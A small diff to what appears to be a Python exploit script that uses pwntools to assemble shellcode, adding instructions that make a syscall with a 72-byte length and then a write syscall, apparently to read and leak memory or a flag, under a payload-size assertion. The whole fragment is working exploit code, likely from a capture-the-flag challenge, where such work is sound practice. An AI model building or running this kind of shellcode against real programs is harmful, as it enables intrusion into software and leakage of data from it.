@@ -27,4 +27,11 @@ payload += pwn.asm("""
         """)
 payload += pwn.asm("""
         mov rsi, """ + hex(address))
+payload += pwn.asm("""
+        mov rdx %s
+        syscall
+        xor rax, rax
+        inc rax
+        syscall
+        """ % (18 * 4))
 assert (len(payload) < 18 * 4), "payload is too long already"
